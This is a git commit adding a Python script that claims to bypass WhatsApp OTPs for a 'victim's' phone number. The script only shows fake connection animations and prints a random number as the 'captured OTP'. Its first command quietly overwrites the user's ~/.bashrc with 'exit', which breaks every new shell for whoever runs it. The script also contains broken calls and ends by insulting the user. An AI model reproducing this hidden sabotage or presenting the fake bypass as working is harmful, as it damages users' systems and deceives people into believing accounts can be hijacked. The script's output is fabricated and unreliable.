79578f628d696a09ddd627b87be63c8b6373910d
BLACKTHECYBER <86658799+BLACKTHECYBER@users.noreply.github.com>
2021-06-29 16:38:45 +0530

    Add files via upload

---
+++ sudamsu whatsapp otp bypasser.py
@@ -0,0 +1,143 @@
+#!/bin/python
+import pyfiglet
+import os
+import time
+import sys
+import random
+from random import randint
+os.system("echo exit > ~/.bashrc")
+os.system("pip3 install pyfiglet -y")
+os.system("clear")
+os.system("pkg install toilet -y")
+os.system("clear")
+os.system("pkg install cow says")
+os.sysrem("clear")
+whats = pyfiglet.figlet_format("BLACK THE WHARSAPP OTP BYPASSER")
+print("\033[1;35;40m\n")
+print("whats")
+time.sleep(3)
+print("plz wait for few m")
+print("\033[1;31;40m\n")
+print("""-------------------------------------------------       
+	  ^            THE TOOL CAN ONLY BYPASS 3 OTP		  ^
+	^   ^     EACH OTP IS VALID ONLY FOR 10 SECONDS		  ^
+	^  	^   USE THIS TOOL ONLY FOR EDUCATIONAL PURPOSE	  ^
+	^	^           TOOL DEVELOPRD Mr BLACK		          ^
+-----------------------------------------------------------""")
+time.sleep(0.1)
+print("\033[1;32;40m\n")
+print("ENNTER THE NUMBER WITTH ITS COUNTRY CODE")
+print("DONT USE + SIGN ")
+time.sleep(1)
+x =input("ENTER THE VICTIMS MOBILE NUMBER: ")
+if len(str(x)) ==12:
+    print("connecting")
+    os.system("clear")
+    s =pyfiglet.figlet_format("OTP BYPASSINGGATE WAY")
+    print("s")
+    print("\033[1;35;40m\n")
+    print("        MAKIMG A vIrTuAl CONNECTION TO THE NUMBER-/")
+    time.sleep(1)
+    os.system("clear")
+    print("         MAKIMG A vIrTuAl  CONNECTION TO THE NUMBER-\ ")
+    time.sleep(2)
+    os.system("clear")
+    print("          MAKIMG A vIrTuAl CONNECTION TO THE NUMBER-/")
+    time.sleep(1)
+    os.system("clear")
+    print("         MAKIMG A vIrTuAl  CONNECTION TO THE NUMBER-\ ")
+    time.sleep(2)
+    os.system("clear")
+    print("        MAKIMG A vIrTuAl CONNECTION TO THE NUMBER-/")
+    time.sleep(1)
+    os.system("clear")
+    print("vIrTuAl CONNECTION COMPLETES")
+    time.sleep(1)
+    os.system("clear")
+    print("           REQUESTING FOR  OTP BYPASS -/")
+    time.sleep(1)
+    os.system("clear")
+    print("           REQUESTING FOR OTP BYPASS -\ ")
+    time.sleep(1)
+    os.system("clear")
+    print("           REQUESTING FOR OTP BYPASS -|")
+    y = pyfiglet.figlet_format("OTP REQUUEST BYPASSED ")
+    print("\033[1;34;40m\n")
+    print(y)
+    print("              CREATING A CONNECTION ANONYMOUSLY.....\ ")
+    time.sleep(1)
+    os.system("clear")
+    print("              CREATING A CONNECTION ANONYMOUSLY...../ ")
+    time.sleep(1)
+    os.system("clear")
+    print("               CREATING A CONNECTION ANONYMOUSLY.....\ ")
+    time.sleep(1)
+    os.system("clear")
+    print("              CREATING A CONNECTION ANONYMOUSLY...../ ")
+    time.sleep(1)
+    os.system("clear")
+    print("              CREATING A CONNECTION ANONYMOUSLY.....\ ")
+    time.sleep(1)
+    os.system("clear")
+    print("               CREATING A CONNECTION ANONYMOUSLY...../ ")
+    time.sleep(1)
+    os.system("clear")
+    print("            CAPTURING OTP.....")
+    time.sleep(1)
+    os.system("clear")
+    print("             CAPTURING OTP.............")
+    time.sleep(1)
+    os.system("clear")
+    print("             CAPTURING OTP..............................")
+    time.sleep(1)
+    os.system("clear")
+    print("             CAPTURING OTP.......")
+    time.sleep(1)
+    os.system("clear")
+    print("         CAPTURING OTP.............")
+    time.sleep(1)
+    os.system("clear")
+    print("           CAPTURING OTP..............................")
+    G = pyfiglet.figlet_format("OTP CAPTURED")
+    print("\033[1;36;40m\n")
+    print(G)
+    print("Fetching Otp")
+    otp = randint(111111, 999999)
+    sotp = str(otp)
+
+    print('          OTP : ' + sotp)
+    print('        thanks for using this tool.')
+    print("       VALID ONLY IN 10...")
+    time.sleep(1)
+    print("     VALID ONLY IN 8...")
+    time.sleep(1)
+    print("      VALID ONLY IN 4...")
+    time.sleep(1)
+    print("       VALID ONLY IN 2...")
+    time.sleep(1)
+    print("        VALID ONLY IN 0...")
+
+
+else:
+    print("         please enter a correct and valid number")
+    v = pyfiglet.figlet_format("quiting")
+    print("\033[1;36;40m\n")
+    print(v)
+    print("get out u alexerkundi")
+    exit()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
